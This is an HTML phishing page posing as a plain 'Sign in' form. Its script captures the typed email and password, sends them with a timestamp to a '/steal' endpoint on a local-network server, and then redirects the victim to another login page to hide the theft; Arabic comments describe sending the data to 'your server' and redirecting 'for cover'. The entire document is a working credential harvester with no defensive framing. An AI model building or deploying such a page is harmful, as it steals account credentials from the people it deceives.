<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Login</title>
</head>
<body>
  <h2>Sign in</h2>
  <form id="loginForm">
    <input type="email" id="email" placeholder="Email" required /><br><br>
    <input type="password" id="password" placeholder="Password" required /><br><br>
    <button type="submit">Log In</button>
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      // قراءة القيم المدخلة
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // إرسال البيانات لسيرفرك
      fetch('http://192.168.1.2:3000/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
      }).catch(console.error);

      // يمكن توجه المستخدم بعد ما يكتب بياناته لأي صفحة حقيقية أو صفحة خطأ للتغطية
      window.location.href = "https://real-login-page.com";
    });
  </script>
</body>
</html>
